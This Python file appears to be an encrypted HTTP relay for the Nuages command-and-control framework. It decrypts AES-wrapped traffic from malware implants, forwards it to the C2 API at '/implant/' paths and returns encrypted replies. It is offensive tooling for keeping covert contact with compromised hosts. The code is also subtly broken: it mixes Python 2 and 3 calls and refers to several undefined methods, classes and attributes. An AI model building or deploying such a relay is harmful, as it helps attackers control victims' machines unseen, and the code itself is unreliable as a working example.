from http.server import HTTPServer, BaseHTTPRequestHandler
import base64
import hashlib
import requests
from Crypto import Random
from Crypto.Cipher import AES
import cgi
from sys import argv
import binascii
import StringIO
import argparse
import os

class PKCS7Encoder(object):
    def __init__(self, k=16):
       self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, text):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        nl = len(text)
        val = int(binascii.hexlify(text[-1]), 16)
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')

        l = nl - val
        return text[:l]

    ## @param text The text to encode.
    def encode(self, text):
        '''
        Pad an input string according to PKCS#7
        '''
        l = len(text)
        output = StringIO.StringIO()
        val = self.k - (l % self.k)
        for _ in xrange(val):
            output.write('%02x' % val)
        return text + binascii.unhexlify(output.getvalue())

class AESCipher(object):

    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        #return base64.b64encode(iv + cipher.encrypt(raw))
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return pkcs7.encode(s)

    def _unpad(self, s):
        return pkcs7.decode(s)



class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.getheader('content-length'))
        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers.getheader('Authorization')))
        print(url)
        try:
            response = (self.POST(url,aes.decrypt(self.rfile.read(length))))
            self._set_headers(200)
            self.wfile.write(aes.encrypt(response))
        except HTTPerror as e:
            self._set_headers(e.HTTPCode)
            self.wfile.write(aes.encrypt(e.HTTPContent))
        except Exception as e:
            print(e)

    def end_headers(self):
        self.send_my_headers()
        SimpleHTTPServer.SimpleHTTPRequestHandler.end_headers(self)

    def send_my_headers(self):
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start an encrypted Nuages HTTP handler')
    parser.add_argument("-p", "--port", default=80,  help="The port to listen on")
    parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
    parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
    parser.add_argument("-d", "--directory", help="Directory to serve for GET requests")
    args = parser.parse_args() 
    # The encryption password
    aes = AESCipher(args.key)
    #The address of the Nuages C2 Server
    connectionString  = args.uri
    if args.directory != None:
        print("HERE")
        os.chdir(os.directory)
    pkcs7 = PKCS7Encoder()
    if len(argv) > 1:
        httpd = HTTPServer(('0.0.0.0', args.port), SimpleHTTPRequestHandler)
        httpd.serve_forever()
    else:
        run()